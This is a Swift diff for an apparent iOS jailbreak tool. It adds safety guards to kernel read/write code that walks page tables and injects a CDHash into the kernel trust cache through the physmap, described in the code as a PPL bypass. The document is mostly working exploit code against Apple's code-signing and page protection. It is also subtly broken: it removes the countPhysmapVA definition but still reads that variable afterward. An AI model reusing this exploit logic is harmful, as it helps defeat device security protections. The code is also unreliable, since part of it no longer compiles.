@@ -24,6 +24,7 @@ private enum PhysmapConstants {
         UserDefaults.standard.set(String(format: "%llx", gVirtBase), forKey: gVirtKey)
         UserDefaults.standard.set(String(format: "%llx", gPhysBase), forKey: gPhysKey)
         UserDefaults.standard.set(true, forKey: verifiedKey)
+        clearProbeOK()
     }
 
     static func load() -> (gVirtBase: UInt64, gPhysBase: UInt64)? {
@@ -74,6 +75,18 @@ private enum PhysmapConstants {
 
     static var isVerified: Bool { UserDefaults.standard.bool(forKey: verifiedKey) }
 
+    private static let probeOKKey = "dsploit.physmap.probeOK"
+
+    static func markProbeOK() {
+        UserDefaults.standard.set(true, forKey: probeOKKey)
+    }
+
+    static func clearProbeOK() {
+        UserDefaults.standard.removeObject(forKey: probeOKKey)
+    }
+
+    static var isProbeOK: Bool { UserDefaults.standard.bool(forKey: probeOKKey) }
+
     static var statusSummary: String {
         if let p = load() {
             return "gVirt=0x\(String(format: "%llx", p.gVirtBase)) gPhys=0x\(String(format: "%llx", p.gPhysBase))"
@@ -105,6 +118,43 @@ private func isKernelOrPhysmapVA(_ v: UInt64) -> Bool {
 
 private func isReasonablePhysTT(_ v: UInt64) -> Bool {
     v >= 0x800000000 && v < 0x1000000000
+}
+
+/// Socket KRW must not touch garbage VAs — caused panic: copy_validate_kernel_addr(0xfffffffbffffffff).
+private func isSafePhysmapKRWAddress(_ va: UInt64) -> Bool {
+    guard va >= 0xffffffdc00000000 && va < 0xffffffe500000000 else { return false }
+    if va >= 0xfffffffa00000000 { return false }
+    return true
+}
+
+private func physmapVA(fromPhysical phys: UInt64, gVirt: UInt64, gPhys: UInt64, offset: UInt64 = 0) -> UInt64? {
+    guard isReasonablePhysTT(phys) else { return nil }
+    let va = phys &- gPhys &+ gVirt &+ offset
+    guard isSafePhysmapKRWAddress(va) else { return nil }
+    return va
+}
+
+private func safeKread64Physmap(_ va: UInt64) -> UInt64 {
+    guard isSafePhysmapKRWAddress(va) else { return 0 }
+    return ds_kread64_safe(va)
+}
+
+private func safeKwrite64Physmap(_ va: UInt64, _ value: UInt64) -> Bool {
+    guard isSafePhysmapKRWAddress(va) else { return false }
+    ds_kwrite64(va, value)
+    return true
+}
+
+private func safeKwrite32Physmap(_ va: UInt64, _ value: UInt32) -> Bool {
+    guard isSafePhysmapKRWAddress(va) else { return false }
+    ds_kwrite32(va, value)
+    return true
+}
+
+private func safeKwrite16Physmap(_ va: UInt64, _ value: UInt16) -> Bool {
+    guard isSafePhysmapKRWAddress(va) else { return false }
+    ds_kwrite16(va, value)
+    return true
 }
 
 private func isLikelyKernelPointer(_ v: UInt64) -> Bool {
@@ -395,7 +445,8 @@ struct AMFIExperimentView: View {
                     color: .red,
                     label: "TC Inject",
                     action: { showInjectConfirm = true },
-                    needsVerified: true
+                    needsVerified: true,
+                    needsProbe: true
                 )
 
                 pathButton(
@@ -508,7 +559,8 @@ struct AMFIExperimentView: View {
         color: Color,
         label: String,
         action: @escaping () -> Void,
-        needsVerified: Bool
+        needsVerified: Bool,
+        needsProbe: Bool = false
     ) -> some View {
         Button(action: action) {
             HStack {
@@ -520,7 +572,11 @@ struct AMFIExperimentView: View {
                 }
             }
         }
-        .disabled(isRunning || !mgr.rcready || (needsVerified && !PhysmapConstants.isVerified))
+        .disabled(
+            isRunning || !mgr.dsready
+                || (needsVerified && !PhysmapConstants.isVerified)
+                || (needsProbe && !PhysmapConstants.isProbeOK)
+        )
     }
 
     // MARK: - Jailbreak path runners
@@ -592,9 +648,22 @@ struct AMFIExperimentView: View {
         }
     }
 
+    /// Inject = KRW-only (no launchd). Validates physmap VA before any write.
     private func runExp77Inject() {
-        runExperiment(label: "TC Inject", operation: "exp77_inject", append: true) { rc in
-            self.expTrustCacheWrite(rc: rc, dryRun: false)
+        isRunning = true
+        runningLabel = "TC Inject"
+        guard mgr.dsready, PhysmapConstants.isVerified, PhysmapConstants.isProbeOK else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expTrustCacheWrite(rc: nil, dryRun: false)
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
         }
     }
 
@@ -4187,9 +4256,10 @@ struct AMFIExperimentView: View {
                 let sL3VA = (sL2E & 0x0000FFFFFFFC0000) &- gPhysBase &+ gVirtBase
                 let sL3E = ds_kread64_safe(sL3VA + sL3Idx * 8)
                 guard sL3E & 0x3 == 0x3 else { continue }
-                let pagePhysmapVA = (sL3E & 0x0000FFFFFFFC0000) &- gPhysBase &+ gVirtBase
+                let pagePhys = sL3E & 0x0000FFFFFFFC0000
+                guard let pagePhysmapVA = physmapVA(fromPhysical: pagePhys, gVirt: gVirtBase, gPhys: gPhysBase) else { continue }
                 for off in stride(from: UInt64(0), to: UInt64(0x4000), by: 8) {
-                    let val = ds_kread64_safe(pagePhysmapVA + off)
+                    let val = safeKread64Physmap(pagePhysmapVA + off)
                     if tryTrustCachePointer(val, label: "PT page \(pageIdx)+0x\(String(format: "%x", off))", physmapBase: pagePhysmapVA + off) {
                         break
                     }
@@ -4252,7 +4322,18 @@ struct AMFIExperimentView: View {
         if dryRun {
             detail += "\n✅ PROBE OK — trust cache ditemukan, physmap read siap.\n"
             detail += "Langkah berikutnya: ③ Trust Cache Inject (risiko panic).\n"
+            PhysmapConstants.markProbeOK()
             return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
+        }
+
+        guard PhysmapConstants.isVerified else {
+            detail += "❌ Exp 74 belum verified — inject dibatalkan\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+        guard usePageTableWalk, tteBase != 0 else {
+            detail += "❌ Kernel page table tidak valid — inject dibatalkan (cegah panic)\n"
+            detail += "Alamat physmap salah → copy_validate_kernel_addr panic.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
 
         // ============================================================
@@ -4280,32 +4361,42 @@ struct AMFIExperimentView: View {
         }
         
         let tcL2Phys = tcL1E & 0x0000FFFFFFFC0000
-        let tcL2VA = tcL2Phys &- gPhysBase &+ gVirtBase
-        let tcL2E = ds_kread64_safe(tcL2VA + tcL2Idx * 8)
+        guard let tcL2VA = physmapVA(fromPhysical: tcL2Phys, gVirt: gVirtBase, gPhys: gPhysBase) else {
+            detail += "❌ TC L2 physmap VA invalid (phys=0x\(String(format: "%llx", tcL2Phys)))\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+        let tcL2E = safeKread64Physmap(tcL2VA + tcL2Idx * 8)
         guard tcL2E & 0x3 == 0x3 else {
             detail += "❌ TC L2 entry invalid: 0x\(String(format: "%llx", tcL2E))\n"
             if tcL2E & 0x3 == 0x1 {
                 // Block entry — 32MB block
                 let blockPhys = tcL2E & 0x0000FFFFFE000000
                 let tcPhys = blockPhys | (tcVA & 0x1FFFFFF)
-                let tcPhysmapVA = tcPhys &- gPhysBase &+ gVirtBase
-                detail += "L2 BLOCK entry! phys=0x\(String(format: "%llx", tcPhys))\n"
-                detail += "physmap VA: 0x\(String(format: "%llx", tcPhysmapVA))\n"
-                // Use this for write
+                if let tcPhysmapVA = physmapVA(fromPhysical: tcPhys, gVirt: gVirtBase, gPhys: gPhysBase) {
+                    detail += "L2 BLOCK entry! phys=0x\(String(format: "%llx", tcPhys))\n"
+                    detail += "physmap VA: 0x\(String(format: "%llx", tcPhysmapVA))\n"
+                }
             }
             return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
         
         let tcL3Phys = tcL2E & 0x0000FFFFFFFC0000
-        let tcL3VA = tcL3Phys &- gPhysBase &+ gVirtBase
-        let tcL3E = ds_kread64_safe(tcL3VA + tcL3Idx * 8)
+        guard let tcL3VA = physmapVA(fromPhysical: tcL3Phys, gVirt: gVirtBase, gPhys: gPhysBase) else {
+            detail += "❌ TC L3 table physmap VA invalid\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+        let tcL3E = safeKread64Physmap(tcL3VA + tcL3Idx * 8)
         guard tcL3E & 0x3 == 0x3 else {
             detail += "❌ TC L3 entry invalid: 0x\(String(format: "%llx", tcL3E))\n"
             return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
         
         let tcPagePhys = tcL3E & 0x0000FFFFFFFC0000
-        let tcPhysmapVA = tcPagePhys &- gPhysBase &+ gVirtBase &+ tcPageOff
+        guard let tcPhysmapVA = physmapVA(fromPhysical: tcPagePhys, gVirt: gVirtBase, gPhys: gPhysBase, offset: tcPageOff) else {
+            detail += "❌ TC page physmap VA invalid (phys=0x\(String(format: "%llx", tcPagePhys)))\n"
+            detail += "Inject dibatalkan — alamat seperti 0xfffffffb… memicu kernel panic.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
         
         detail += "✅ TC physical page: 0x\(String(format: "%llx", tcPagePhys))\n"
         detail += "✅ TC physmap VA: 0x\(String(format: "%llx", tcPhysmapVA))\n"
@@ -4313,7 +4404,7 @@ struct AMFIExperimentView: View {
         
         // Verify physmap read matches direct read
         let tcVerifyDirect = ds_kread64_safe(tcStructAddr)
-        let tcVerifyPhysmap = ds_kread64_safe(tcPhysmapVA)
+        let tcVerifyPhysmap = safeKread64Physmap(tcPhysmapVA)
         detail += "Direct read TC: 0x\(String(format: "%llx", tcVerifyDirect))\n"
         detail += "Physmap read TC: 0x\(String(format: "%llx", tcVerifyPhysmap))\n"
         
@@ -4337,41 +4428,49 @@ struct AMFIExperimentView: View {
         let injL3Idx = (injectVA >> 14) & 0x7FF
         let injPageOff = injectVA & 0x3FFF
         
-        var injectPhysmapVA: UInt64
+        let injectPhysmapVA: UInt64
         if injL3Idx == tcL3Idx {
-            // Same page as TC struct
-            injectPhysmapVA = tcPagePhys &- gPhysBase &+ gVirtBase &+ injPageOff
+            guard let va = physmapVA(fromPhysical: tcPagePhys, gVirt: gVirtBase, gPhys: gPhysBase, offset: injPageOff) else {
+                detail += "❌ Inject physmap VA invalid (same page)\n"
+                return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+            }
+            injectPhysmapVA = va
         } else {
-            // Different page — walk again
-            let injL3E = ds_kread64_safe(tcL3VA + injL3Idx * 8)
+            let injL3E = safeKread64Physmap(tcL3VA + injL3Idx * 8)
             guard injL3E & 0x3 == 0x3 else {
                 detail += "❌ Inject page L3 invalid\n"
                 return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
             }
             let injPagePhys = injL3E & 0x0000FFFFFFFC0000
-            injectPhysmapVA = injPagePhys &- gPhysBase &+ gVirtBase &+ injPageOff
+            guard let va = physmapVA(fromPhysical: injPagePhys, gVirt: gVirtBase, gPhys: gPhysBase, offset: injPageOff) else {
+                detail += "❌ Inject physmap VA invalid\n"
+                return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+            }
+            injectPhysmapVA = va
         }
         
         detail += "Inject entry \(injectIdx) at VA: 0x\(String(format: "%llx", injectVA))\n"
         detail += "Inject physmap VA: 0x\(String(format: "%llx", injectPhysmapVA))\n\n"
         
-        // WRITE THROUGH PHYSMAP — This bypasses PPL!
+        guard isSafePhysmapKRWAddress(injectPhysmapVA), isSafePhysmapKRWAddress(tcPhysmapVA + 4) else {
+            detail += "❌ Refusing physmap write — VA outside safe zone (panic prevention)\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+        
         detail += "🔥 WRITING CDHash via PHYSMAP (PPL bypass)...\n"
         
-        // Test CDHash: all 0x41 (easily identifiable)
-        ds_kwrite64(injectPhysmapVA, 0x4141414141414141)
-        ds_kwrite64(injectPhysmapVA + 8, 0x4141414141414141)
-        ds_kwrite32(injectPhysmapVA + 16, 0x41414141)
-        // hashType = 2 (SHA256), flags = 0
-        ds_kwrite16(injectPhysmapVA + 20, 0x0002)
+        let w1 = safeKwrite64Physmap(injectPhysmapVA, 0x4141414141414141)
+        let w2 = safeKwrite64Physmap(injectPhysmapVA + 8, 0x4141414141414141)
+        let w3 = safeKwrite32Physmap(injectPhysmapVA + 16, 0x41414141)
+        let w4 = safeKwrite16Physmap(injectPhysmapVA + 20, 0x0002)
+        let w5 = safeKwrite32Physmap(tcPhysmapVA + 4, UInt32(tcEntryCount + 1))
         
-        // Update entry count (also via physmap)
-        // count is at tcStructAddr + 4 → compute its physmap VA
-        let countPhysmapVA = tcPhysmapVA + 4
-        ds_kwrite32(countPhysmapVA, UInt32(tcEntryCount + 1))
+        guard w1 && w2 && w3 && w4 && w5 else {
+            detail += "❌ Physmap write blocked (invalid VA guard)\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
         
-        // Verify write
-        let verifyH = ds_kread64_safe(injectPhysmapVA)
+        let verifyH = safeKread64Physmap(injectPhysmapVA)
         let newCount = ds_kread32_safe(countPhysmapVA)
         detail += "Verify CDHash: 0x\(String(format: "%llx", verifyH))\n"
         detail += "New count: \(newCount) (was \(tcEntryCount))\n\n"
